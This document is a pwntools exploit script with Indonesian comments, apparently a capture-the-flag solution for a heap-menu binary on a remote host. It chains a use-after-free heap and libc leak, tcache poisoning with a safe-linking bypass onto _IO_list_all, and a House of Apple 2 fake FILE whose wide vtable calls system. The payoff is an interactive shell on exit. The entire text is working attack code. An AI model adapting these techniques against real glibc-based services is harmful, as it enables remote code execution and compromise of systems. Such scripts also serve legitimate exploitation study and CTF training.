from pwn import *

context.log_level = 'info'
p = remote('103.152.242.90', 28955)
libc = ELF('./libc.so.6')

def create(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'data: ', data)

def show(idx, size):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    data = p.recvn(size)
    p.recvuntil(b'=== revivify ===\n')
    return data

# ==========================================
# 1. Persiapkan dua chunk 0x20 untuk tcache poisoning
# ==========================================
create(0, 0x20)  # A
create(1, 0x20)  # B
delete(0)        # free A
delete(1)        # free B (tcache: B -> A -> NULL, count=2)

# Leak heap dari A (index 0)
leak = show(0, 0x20)
heap_leak = u64(leak[:8])
heap_base = heap_leak << 12
log.info(f"Heap base: {hex(heap_base)}")

# ==========================================
# 2. Leak Libc dengan Guard Chunk yang tepat
# ==========================================
create(2, 0x500)  # C (target unsorted bin)
create(3, 0x30)   # D (guard chunk, dialokasikan setelah C)
delete(2)         # free C
leak_libc = show(2, 0x500)
main_arena_leak = u64(leak_libc[:8])
libc_base = main_arena_leak - 0x21ace0
log.info(f"Libc base: {hex(libc_base)}")

# Resolve symbols
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
_IO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']
system = libc_base + libc.symbols['system']

# ==========================================
# 3. Siapkan Fake FILE (House of Apple 2)
# ==========================================
# Chunk C user data berada di heap_base + 0x300
fake_file_addr = heap_base + 0x300
fake_wide_data_addr = fake_file_addr + 0x100
fake_vtable_addr = fake_file_addr + 0x200
fake_lock = fake_vtable_addr  # Gunakan area zeroed sebagai lock

fake_FILE = bytearray(0x100)
# Gunakan "dash" agar _IO_NO_WRITES (0x8) dan _IO_UNBUFFERED (0x2) tidak ter-set
fake_FILE[0x00:0x08] = b"dash\x00\x00\x00\x00"
fake_FILE[0x20:0x28] = p64(0)          # _IO_write_base
fake_FILE[0x28:0x30] = p64(1)          # _IO_write_ptr
fake_FILE[0x68:0x70] = p64(0)          # _chain
fake_FILE[0x88:0x90] = p64(fake_lock)  # _lock
fake_FILE[0xa0:0xa8] = p64(fake_wide_data_addr)  # _wide_data
fake_FILE[0xc0:0xc4] = p32(1)          # _mode = 1 (wide mode)
fake_FILE[0xd8:0xe0] = p64(_IO_wfile_jumps)      # vtable

fake_wide_data = bytearray(0x100)
fake_wide_data[0x18:0x20] = p64(0)     # _IO_write_base
fake_wide_data[0x20:0x28] = p64(1)     # _IO_write_ptr
fake_wide_data[0xe0:0xe8] = p64(fake_vtable_addr) # _wide_vtable

fake_vtable = bytearray(0x100)
fake_vtable[0x68:0x70] = p64(system)   # __doallocate -> system (offset 0x68!)

payload = bytes(fake_FILE + fake_wide_data + fake_vtable)

# Tulis payload ke C (index 2, freed)
edit(2, payload)

# ==========================================
# 4. Tcache Poisoning ke _IO_list_all
# ==========================================
# B berada di heap_base + 0x2d0
pos = heap_base + 0x2d0
safe_linked = _IO_list_all ^ (pos >> 12)
edit(1, p64(safe_linked))  # Timpa fd B

# Alokasi dua chunk 0x20
create(4, 0x20)  # Mengambil B
create(5, 0x20)  # Mengambil _IO_list_all

# Timpa _IO_list_all dengan alamat fake FILE
edit(5, p64(fake_file_addr))

# ==========================================
# 5. Trigger Exit
# ==========================================
log.success("Memicu system('dash')...")
p.sendlineafter(b'> ', b'5')
p.interactive()